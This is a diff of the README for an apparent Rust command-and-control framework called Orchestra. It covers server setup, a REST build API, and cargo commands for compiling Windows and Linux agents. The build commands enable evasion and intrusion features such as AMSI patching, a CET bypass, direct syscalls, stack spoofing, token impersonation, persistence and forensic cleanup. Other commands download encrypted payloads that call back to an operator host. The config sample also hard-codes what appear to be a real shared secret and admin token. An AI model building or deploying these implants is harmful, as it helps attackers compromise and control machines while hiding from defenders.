@@ -195,21 +195,34 @@ sudo apt install mingw-w64  # Debian/Ubuntu
 cargo build --release --package orchestra-server
 ```
 
-Create a server configuration file (e.g., `orchestra-server.toml`):
+Create a server configuration file (`orchestra-server.toml`):
 
 ```toml
-http_addr = "0.0.0.0:8443"
-agent_addr = "0.0.0.0:9443"
-agent_shared_secret = "your-32-byte-secret-base64-encoded"
-admin_token = "your-admin-token-here"
-agent_cert_pem = "certs/agent.crt"
-agent_key_pem = "certs/agent.key"
+http_addr            = "0.0.0.0:8443"
+agent_addr           = "0.0.0.0:8444"
+agent_shared_secret  = "RvDPwz+Xl7WuOkRnE3mIJjDy9B9oDyMvUg8fYSZ2EFg="
+admin_token          = "0juoV2FGURAA8lUJ8HzALnXHOKE_yvdg"
+audit_log_path       = "secrets/orchestra-audit.jsonl"
+static_dir           = "orchestra-server/static"
+tls_cert_path        = "secrets/server.crt"
+tls_key_path         = "secrets/server.key"
+command_timeout_secs = 30
+builds_output_dir    = "builds"
+module_aes_key       = "<base64-32-bytes>"  # required for production agent builds
 
-[operators.admin]
-name = "admin"
-token = "operator-token-here"
-permissions = ["all"]
+# Local testing only — allows agents to connect to loopback/private IPs:
+# allow_local_builds = true
 ```
+
+Generate credentials and self-signed TLS material:
+
+```bash
+./scripts/generate-certs.sh
+# Generates secrets/server.crt and secrets/server.key
+# Prints the SHA-256 fingerprint for TLS pinning
+```
+
+Start the server:
 
 ```bash
 ./target/release/orchestra-server --config orchestra-server.toml
@@ -217,19 +230,58 @@ permissions = ["all"]
 
 ### Build an Agent
 
+The recommended way is via the **Builder tab** in the web dashboard
+(`https://<server>:8443/`) or the build REST API:
+
 ```bash
-# Cross-compile for Windows with HTTP transport and full evasion
+# Submit a build via the API
+curl -sk -X POST https://localhost:8443/api/build \
+  -H "Authorization: Bearer <admin-token>" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "os": "linux",
+    "arch": "x86_64",
+    "host": "10.0.0.5",
+    "port": 8444,
+    "pin": "<sha256-cert-fingerprint-64-hex>",
+    "key": "<base64-aes256-encryption-key>",
+    "features": {
+      "persistence": true,
+      "direct_syscalls": true,
+      "stealth": true
+    },
+    "sleep_ms": 5000,
+    "jitter": 20
+  }'
+# → {"job_id":"<uuid>","status":"Queued"}
+
+# Poll for completion
+curl -sk -H "Authorization: Bearer <admin-token>" \
+  https://localhost:8443/api/build/status/<job_id>
+
+# Download the encrypted payload
+curl -sk -H "Authorization: Bearer <admin-token>" \
+  https://localhost:8443/api/build/<job_id>/download -o agent.enc
+```
+
+Or directly with Cargo for development:
+
+```bash
+# Cross-compile for Windows with full evasion
 cargo build --release --package agent \
     --target x86_64-pc-windows-gnu \
     --features "http-transport,outbound-c,direct-syscalls,memory-guard,stack-spoof,cet-bypass,token-impersonation,forensic-cleanup,write-raid-amsi,syscall-emulation"
 
-# Cross-compile for Linux with DoH transport
+# Linux agent with outbound connection
 cargo build --release --package agent \
-    --features "doh-transport,outbound-c" \
+    --bin agent-standalone \
+    --features "outbound-c" \
     --target x86_64-unknown-linux-gnu
 ```
 
-Or use the build API through the server dashboard to build on-demand with specific profiles and features.
+The build API uses the `orchestra-builder` binary and applies all profile
+settings (host, port, PSK, TLS fingerprint, module AES key, features) as
+compile-time environment variables so the resulting binary is self-contained.
 
 ### Build a Redirector
 
@@ -895,6 +947,23 @@ curl -X POST https://c2.example.com/api/mesh/broadcast \
 
 ## Configuration Reference
 
+### Server TOML Configuration Fields
+
+| Field | Type | Default | Description |
+|-------|------|---------|-------------|
+| `http_addr` | string | `0.0.0.0:8443` | Operator HTTPS listener address |
+| `agent_addr` | string | `0.0.0.0:8444` | Agent listener address |
+| `agent_shared_secret` | string | (required) | Base64-encoded PSK for agent authentication |
+| `admin_token` | string | (required) | Bearer token for operator API access |
+| `tls_cert_path` | path | (required) | Path to TLS certificate PEM |
+| `tls_key_path` | path | (required) | Path to TLS private key PEM |
+| `static_dir` | path | `orchestra-server/static` | Static files for web dashboard |
+| `audit_log_path` | path | `orchestra-audit.jsonl` | Path for JSONL audit log |
+| `command_timeout_secs` | u64 | `30` | Max wait for agent command response |
+| `builds_output_dir` | path | `builds` | Output dir for built agent payloads |
+| `module_aes_key` | string | — | Base64 AES-256 key baked into built agents |
+| `allow_local_builds` | bool | `false` | Allow loopback/private IP in build target |
+
 ### Server CLI Arguments
 
 | Flag | Type | Default | Description |
@@ -904,6 +973,18 @@ curl -X POST https://c2.example.com/api/mesh/broadcast \
 | `--agent-secret` | string | (from config) | Override agent shared secret |
 | `--profile-dir` | path | `profiles/` | Malleable profile directory |
 | `--profile` | string | `default` | Active malleable profile name |
+
+### REST API Endpoints
+
+| Method | Path | Auth | Description |
+|--------|------|------|-------------|
+| `GET` | `/api/agents` | Bearer | List connected agents |
+| `POST` | `/api/agents/<id>/command` | Bearer | Send command, get response |
+| `POST` | `/api/build` | Bearer | Queue an agent build job |
+| `GET` | `/api/build/status/<job_id>` | Bearer | Poll build job status and log |
+| `GET` | `/api/build/<job_id>/download` | Bearer | Download encrypted agent payload |
+| `GET` | `/api/info/fingerprint` | Bearer | Get server cert SHA-256 fingerprint |
+| `GET` | `/api/audit` | Bearer | Retrieve audit log entries |
 
 ### Server Subcommands
 
@@ -950,12 +1031,13 @@ curl -X POST https://c2.example.com/api/mesh/broadcast \
 
 | Variable | Context | Description |
 |----------|---------|-------------|
-| `ORCHESTRA_C_ADDR` | Agent build / runtime | Server address |
-| `ORCHESTRA_C_SECRET` | Agent build / runtime | Pre-shared key |
-| `ORCHESTRA_C_CERT_FP` | Agent build / runtime | Server certificate SHA-256 fingerprint |
+| `ORCHESTRA_C_ADDR` | Agent build | Server address baked in at compile time → `SYS_C_ADDR` |
+| `ORCHESTRA_C_SECRET` | Agent build | Pre-shared key baked in at compile time → `SYS_C_SECRET` |
+| `ORCHESTRA_C_CERT_FP` | Agent build | Server certificate SHA-256 fingerprint → `SYS_C_CERT_FP` |
+| `ORCHESTRA_MODULE_AES_KEY` | Agent build | Module decryption key baked in → `SYS_MODULE_KEY` |
 | `ORCHESTRA_C_MTLS_CERT` | Agent build / runtime | mTLS client certificate PEM path |
 | `ORCHESTRA_C_MTLS_KEY` | Agent build / runtime | mTLS client key PEM path |
-| `ORCHESTRA_SECRET` | Agent runtime | Fallback shared secret |
+| `ORCHESTRA_SECRET` | Agent runtime | Fallback shared secret (debug builds only) |
 | `ORCHESTRA_CONFIG_HMAC` | Agent runtime | Expected config HMAC |
 
 ### Launcher CLI Arguments
@@ -1117,3 +1199,30 @@ sudo apt install gcc-aarch64-linux-gnu
 | `scripts/generate-certs.sh` | Generate self-signed TLS certs |
 | `scripts/dev-start.sh` | Start server + dev-server |
 | `scripts/package.sh` | Package release artifacts |
+
+---
+
+## Documentation
+
+| Document | Description |
+|----------|-------------|
+| [docs/QUICKSTART.md](docs/QUICKSTART.md) | Step-by-step first run guide |
+| [docs/CONFIGURATION.md](docs/CONFIGURATION.md) | Complete configuration reference |
+| [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) | System design and data flows |
+| [docs/FEATURES.md](docs/FEATURES.md) | Feature flag reference |
+| [docs/OPERATOR_MANUAL.md](docs/OPERATOR_MANUAL.md) | Operator command reference |
+| [docs/CONTROL_CENTER.md](docs/CONTROL_CENTER.md) | REST API reference |
+| [docs/C_SERVER.md](docs/C_SERVER.md) | C2 server internals |
+| [docs/MALLEABLE_PROFILES.md](docs/MALLEABLE_PROFILES.md) | Malleable profile authoring guide |
+| [docs/P2P_MESH.md](docs/P2P_MESH.md) | P2P mesh networking reference |
+| [docs/INJECTION_ENGINE.md](docs/INJECTION_ENGINE.md) | Injection engine reference |
+| [docs/SLEEP_OBFUSCATION.md](docs/SLEEP_OBFUSCATION.md) | Sleep obfuscation internals |
+| [docs/EVASION.md](docs/EVASION.md) | EDR/AV evasion techniques |
+| [docs/LAUNCHER.md](docs/LAUNCHER.md) | Stage-0 launcher reference |
+| [docs/REDIRECTOR_GUIDE.md](docs/REDIRECTOR_GUIDE.md) | Redirector deployment guide |
+| [docs/FORENSICS.md](docs/FORENSICS.md) | Forensic artifacts and cleanup |
+| [docs/POST_EXPLOITATION.md](docs/POST_EXPLOITATION.md) | Post-exploitation techniques |
+| [docs/LOCAL_TESTING_GUIDE.md](docs/LOCAL_TESTING_GUIDE.md) | Verified localhost test setup |
+| [docs/SECURITY.md](docs/SECURITY.md) | Security model and audit notes |
+| [docs/SECURITY_AUDIT.md](docs/SECURITY_AUDIT.md) | External security audit results |
+| [docs/INTEGRATION_TEST_WALKTHROUGH.md](docs/INTEGRATION_TEST_WALKTHROUGH.md) | End-to-end integration test record |
